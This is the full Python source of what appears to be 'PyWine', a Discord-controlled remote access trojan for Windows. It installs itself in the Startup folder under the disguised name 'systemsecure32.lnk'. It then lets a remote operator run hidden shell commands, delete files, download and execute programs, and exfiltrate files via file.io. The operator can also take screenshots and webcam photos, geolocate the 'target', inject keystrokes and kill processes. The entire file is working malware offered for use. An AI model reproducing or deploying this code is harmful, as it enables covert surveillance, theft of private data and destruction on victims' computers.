import discord
from discord.ext import commands
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from PIL import ImageGrab
import io
import os
import subprocess
import socket
import urllib.request
from datetime import datetime
import tkinter as tk
from tkinter import messagebox
import ctypes
import win32api
import win32con
import requests
import urllib.parse
import tempfile
import webbrowser
import psutil
import win32com.client
from PIL import Image
import cv2
import numpy as np
import keyboard


def add_to_startup():
    # Get the path to this script
    script_path = os.path.abspath(__file__)

    # Define the path to the startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

    # Define the path for the shortcut
    shortcut_path = os.path.join(startup_folder, 'systemsecure32.lnk')

    # Create a shortcut
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = script_path
    shortcut.save()

    print(f"Shortcut created at: {shortcut_path}")

add_to_startup()

def show_message_box(title, message):
    # Create a root window (it won't be shown)
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    # Show the message box
    messagebox.showinfo(title, message)

    # Clean up and close the root window
    root.destroy()

def get_public_ip():
    try:
        # Query an external service to get the public IP address
        with urllib.request.urlopen('http://api.ipify.org') as response:
            public_ip = response.read().decode('utf-8')
    except Exception as e:
        return f"Error fetching public IP: {e}"
    
    return public_ip

def get_local_ip():
    try:
        # Create a socket and connect to a remote server
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))  # Google's DNS server
        local_ip = s.getsockname()[0]
    finally:
        s.close()
    
    return local_ip

def upload_to_file_io(file_path):
    url = "https://file.io/"
    with open(file_path, 'rb') as file:
        response = requests.post(url, files={"file": file})
        if response.status_code == 200:
            return response.json()
        else:
            raise Exception(f"Failed to upload file: {response.status_code}, {response.text}")

def text_to_speech(text):
    """
    Convert text to speech using Windows TTS engine.

    Parameters:
    - text (str): The text to convert to speech.
    """
    # Create a TTS engine instance
    speaker = win32com.client.Dispatch("SAPI.SpVoice")
    
    # Speak the text
    speaker.Speak(text)



# Vars
TOKEN = 'TOKEN_HERE'
YOUR_DISCORD_USER_ID = 11111
CHANNEL_ID = 22222
LOCAL_IP = get_local_ip()
PUBLIC_IP = get_public_ip()
TIME = datetime.now()
NAME = __file__
TEMP = temp_dir = tempfile.mkdtemp()
blocked_websites = set()
# Set up the intents (you may enable more if needed)




intents = discord.Intents.default()
intents.message_content = True  # Required to read message content




# Set up the bot with a command prefix and intents
bot = commands.Bot(command_prefix=".", intents=intents)

#defs
# Function to change system volume
def set_volume(volume: int):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume_control = cast(interface, POINTER(IAudioEndpointVolume))

    # Ensure volume is within bounds (0-100)
    volume = max(0, min(100, volume))
    
    # Set the volume (scale: 0.0 to 1.0)
    volume_control.SetMasterVolumeLevelScalar(volume / 100.0, None)
#start

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(f'```{LOCAL_IP} Started New Session At {TIME}```')


#commands




# Command to change volume
@bot.command(name='vol')
async def change_volume(ctx, volume: int):
    if 0 <= volume <= 100:
        set_volume(volume)
        await ctx.send(f"Volume set to {volume}%")
    else:
        await ctx.send("Please provide a volume between 0 and 100.")

# Command to take a screenshot and send it
@bot.command(name='ss')
async def screenshot(ctx):
    # Capture the screen
    screenshot = ImageGrab.grab()
    
    # Save the screenshot to a BytesIO object
    image_binary = io.BytesIO()
    screenshot.save(image_binary, 'PNG')
    image_binary.seek(0)
    
    # Send the screenshot in the Discord channel
    await ctx.send(file=discord.File(fp=image_binary, filename='screenshot.png'))
    
    # Close the BytesIO object to free memory
    image_binary.close()

# Command to shut down the system
@bot.command(name='shutdown')
async def shutdown(ctx):
    # Make sure the command is run by the server owner or a specific user
    if ctx.author.id == YOUR_DISCORD_USER_ID:  # Replace with your Discord user ID
        await ctx.send("Shutting down the system...")
        os.system("shutdown /s")  # Execute the system shutdown command
    else:
        await ctx.send("You do not have permission to use this command.")


@bot.command(name='cmd')
async def cmd(ctx, *, command: str):
    # WARNING: Executing system commands directly is dangerous!
    # Consider adding proper validation and restrictions here.
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout or result.stderr
        await ctx.send(f"```{output}```")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(name='cd')
async def cd(ctx, *, cd: str):
    try:
        os.chdir(cd)
        await ctx.send(f"```Changed Directory To {cd}```")
    except Exception as e:
        await ctx.send(f"ERROR {e}")  

@bot.command(name='ls')
async def ls(ctx):
    try:
        # Run the command and capture the output
        result = subprocess.run(["dir"], shell=True, capture_output=True, text=True)
        # Send the output to the Discord channel
        await ctx.send(f"```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"ERROR: {e}")

@bot.command(name='rmdir')        
async def rmdir(ctx, *, dir: str):
    try:
        os.system(f"rmdir {dir}")
        await ctx.send(f"```Removed Driectory ''{dir}''```")
    except Exception as e:
        await ctx.send(f"```Error {e}```")

@bot.command(name='delete')
async def delete(ctx, *, file: str):
    try:
        os.system(f"DEL {file}")
        await ctx.send(f"```Deleted {file}``` :smile:")
    except Exception as e:
        await ctx.send(f"ERROR: {e} | meaby you shoud try ''.rmdir'' :smile:")                

@bot.command(name='geolocate')
async def geolocate(ctx):
    try:
        # Use subprocess.run to call curl
        result = subprocess.run(
            ['curl', f'https://ipinfo.io/{PUBLIC_IP}/json'],
            capture_output=True,
            text=True
        )
        output = result.stdout

        search_term = "loc"

        lines = output.splitlines()

        
        found = False
        for line in lines:
          if search_term in line:
            word_to_remove = '"loc": "'
            secwordtoremove = '",'
            modified_text = line.replace(word_to_remove, "")
            almost = modified_text.replace(secwordtoremove, "")
            final = almost.replace(" ", "")
            
            found = True

        if not found:
          pass
        
        # Check if the command was successful
        if result.returncode == 0:
            # Send the output of the curl command
            await ctx.send(f"```json\n{result.stdout}```")
            await ctx.send(f"this is loc in [google maps](<http://maps.google.com/?q={final}>)")
        else:
            # Send an error message if the command failed
            await ctx.send(f"```ERROR: Command failed with return code {result.returncode}```")
    
    except Exception as e:
        await ctx.send(f"```ERROR: {e}```")

@bot.command(name='credits')
async def credits(ctx):
    await ctx.send(f"Credits To [Venodev](<https://github.com/ggvenodev>)")

@bot.command(name='msg')
async def msg(ctx, *, message: str):
    # Create a message box with the given message
    win32api.MessageBox(0, message, NAME, win32con.MB_OK)
    # Send a confirmation message in Discord
    await ctx.send(f"Message box displayed with message: {message}")

@bot.command(name='execute')
async def execute(ctx, *, file: str):
    try:
     if not "." in file:
         os.system(file)
         await ctx.send("changed file")
     else:
         await ctx.send("file does not contain ''.'' in it")
            
    except Exception as e:
        await ctx.send(f"{file} cannot be opend: {e}") 

@bot.command(name='upload')
async def upload(ctx, *, url):
    try:
     # Send a GET request to the URL
     response = requests.get(url)
     response.raise_for_status()  # Raise an exception for HTTP errors

     # Default filename
     filename = "downloaded_file"

     # Check if Content-Disposition header is present
     content_disposition = response.headers.get('content-disposition')
     if content_disposition:
        # Handle UTF-8 encoded filenames
         if "filename*=" in content_disposition:
             filename_part = content_disposition.split("filename*=")[-1]
             filename = urllib.parse.unquote(filename_part.split("''")[-1])
         elif "filename=" in content_disposition:
             filename_part = content_disposition.split("filename=")[-1]
             filename = filename_part.strip('"')

     # Sanitize the filename for Windows (remove/replace illegal characters)
     invalid_chars = '<>:"/\\|?*'
     filename = ''.join(c if c not in invalid_chars else '_' for c in filename)
 
     # Write the content to a file
     with open(filename, 'wb') as file:
         file.write(response.content)
     
     print(f"File downloaded successfully as {filename}")
     await ctx.send(f"File Uploaded To {NAME}")

    except requests.RequestException as e:
       print(f"An error occurred: {e}")

    except Exception as e:
     print(f"An unexpected error occurred: {e}")

@bot.command(name="download")
async def upload(ctx, *, file_path: str):
    # Normalize the path to handle spaces and backslashes
    file_path = os.path.normpath(file_path)

    # Check if the file exists
    if not os.path.exists(file_path):
        await ctx.send(f"File or directory '{file_path}' not found.")
        return

    # Check if it's a directory or a file
    if os.path.isdir(file_path):
        await ctx.send("Directories cannot be uploaded. Please provide a file path.")
        return

    try:
        # Upload the file to file.io
        result = upload_to_file_io(file_path)
        download_url = result['link']

        # Send the file.io link back to the Discord channel
        await ctx.send(f"File uploaded successfully: {download_url}")
    except Exception as e:
        await ctx.send(f"Error uploading file: {e}")

@bot.command(name='jumpscare')
async def jumpscare(ctx):
    try:
     set_volume(100)
     webbrowser.open("https://youtu.be/uZpMmP5EUEI?t=54")
     await ctx.send(f"jumpscared target")
    except Exception as e:
        await ctx.send(f"ERROR: {e}") 

@bot.command(name="show")
async def show_processors(ctx):
    # Get the list of all processes
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            processes.append(f"PID: {proc.info['pid']} - Name: {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    # Split the processes into manageable chunks (Discord message length limit)
    chunks = [processes[i:i + 10] for i in range(0, len(processes), 10)]
    for chunk in chunks:
        await ctx.send("\n".join(chunk))

# Kill the specified process by its name
@bot.command(name="kill")
async def kill_process(ctx, process_name: str):
    # List to store killed processes
    killed_processes = []
    
    # Iterate over processes and terminate ones that match the name
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() == process_name.lower():  # Case-insensitive matching
                proc.terminate()  # You can use proc.kill() for immediate forceful kill
                killed_processes.append(f"Terminated: PID {proc.info['pid']} - {proc.info['name']}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    if killed_processes:
        await ctx.send("\n".join(killed_processes))
    else:
        await ctx.send(f"No process named '{process_name}' was found or terminated.")

# Clear a certain number of messages
@bot.command(name="clear")
@commands.has_permissions(manage_messages=True)  # Ensure the user has the right permissions
async def clear(ctx, amount: int):
    if amount <= 0:
        await ctx.send("Please specify a number greater than 0.")
        return

    # Deletes the specified number of messages from the channel
    deleted = await ctx.channel.purge(limit=amount + 1)  # +1 to include the clear command itself
    await ctx.send(f"Deleted {len(deleted) - 1} messages.", delete_after=5)  # Delete response after 5 seconds

@bot.command(name='tts')
async def tts(ctx, *, content: str):
    try:
     text_to_speech(content)
     await ctx.send(f"`{content}` has turned into tts")
    except Exception as e:
        await ctx.send(f"coud not play tts {e}") 

@bot.command(name='pwd')
async def pwd(ctx):
    try:
     pwd = os.getcwd()
     await ctx.send(f"{pwd}")
    except Exception as e:
        await ctx.send(f"ERROR: {e}") 


@bot.command()
async def webcamphoto(ctx):
    # Open the webcam
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        await ctx.send("Couldn't access the webcam.")
        return

    # Capture a single frame
    ret, frame = cap.read()
    cap.release()

    if not ret:
        await ctx.send("Failed to capture image.")
        return

    # Convert the frame to PIL Image format
    image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))

    # Save image to a bytes buffer
    buffer = io.BytesIO()
    image.save(buffer, format='PNG')
    buffer.seek(0)

    # Send the image to Discord
    await ctx.send(file=discord.File(fp=buffer, filename='webcamphoto.png'))

@bot.command(name='key')
async def key(ctx, *, content: str):
    if "ENTER" in content:       
        for char in content:
         keyboard.write(char)
         keyboard.press_and_release('enter')
    elif "ALTF4" in content:
        keyboard.press_and_release('alt+f4')
    elif "CTRLSHIFTESC" or "MENAGE" in content:
        keyboard.press_and_release('ctrl+shift+esc')    
    else:     
     # Simulate key presses for each character in the content
     for char in content:
         keyboard.write(char)
     await ctx.send(f'Sent "{content}" to your keyboard.')


@bot.command(name='winehelpkey')
async def winehelpkey(ctx):
    try:
     await ctx.send("""
                    ENTER - presses enter
                    ALTF4 - closes current window
                    CTRLSHIFTESC or MEANAGE - opens meanage tasks
                    ...                                  
                 """)
    except Exception as e:
        await ctx.send(f"ERROR: {e}") 


@bot.command(name='browser')
async def browser(ctx, *, site):
    try:
        if "https://" or "http://" in site:
            webbrowser.open(site)
            await ctx.send(f"Succesfuy opend {site}")
        elif not "https://" or "http://" in site:
            webbrowser.open(f"https://{site}")
            await ctx.send(f"Succesfuly Opend https://{site}")  
    except Exception as e:
        await ctx.send(f"coud not open {site}")        
        
@bot.command(name='find')
async def find_ip(ctx):
    try:     
        await ctx.send(f"Local Ip: {LOCAL_IP}, Public Ip: {PUBLIC_IP}")        
    except Exception as e:
        await ctx.send(f"ERROR: {e}")  



@bot.command(name='winehelp')
async def winehelp(ctx):
    try:
        await ctx.send("""
     **Help Wine Commands - Page 1:**

        `.vol [1-100]` - Set Target Volume  
        `.ss` - Makes Screenshot and sends it [kind spy thing 🤫]  
        `.shutdown` - Shutdown target's computer [by running `shutdown /s`]  
        `.cmd [command]` - Executes command hidden and captures output (depends on permissions 😎)  
        `.cd [directory]` - Changes directory  
        `.ls` - Shows current files in directory  
        `.rmdir [dir or directory]` - Removes folder(s)  
        `.delete [file or directory]` - Removes file(s)
        `.geolocate` - Geolocates IP address  

                                    
""")
        await ctx.send("""
        `.msg [content]` - Message popup  
        `.execute [file or dir.exe]` - Executes chosen file  
        `.upload [file.io link]` - Downloads file from file.io link on target's PC  
        `.download [file or patch]` - Uploads file/directory to file.io and sends it to you  
        `.jumpscare` - Sets volume to 100 and opens [jumpscare](<https://youtu.be/uZpMmP5EUEI?t=54>) link  
        `.show processors` - Shows list of processors  
        `.kill [process]` - Kills running process  
        `.clear [amount]` - Clears a specified number of messages
        `.credits` - Shows credits of [developer](<https://gist.github.com/ggvenodev>)
        `.tts [content]` - Plays tts message on targets computer
        `.pwd` - shows current directory
        `.webcamphoto` - makes picture of webcam and sends it
        `.key [content]` - writes on targets keaboard "[content]" (TYPE "winehelp_key" to recive help)
        `.browser [url]` - Opens Browser Url on Targets Pc
        `find ip` - finds ip of target              

        ⚠️ **WARNING:** You take full responsibility for whatever you're doing. ⚠️
                       
        **Help Wine Commands - Page 3:**
            **Plans For Updates**
        1. Add Multi Targets To one server.
        2. Make better gui.  
         -----------------------------------
        meaby you shoud give me a [star](<https://github.com/ggvenodev/PyWine>) :) 
""")
    except Exception as e:
        await ctx.send(f"ERROR: {e}") 



bot.run(TOKEN)
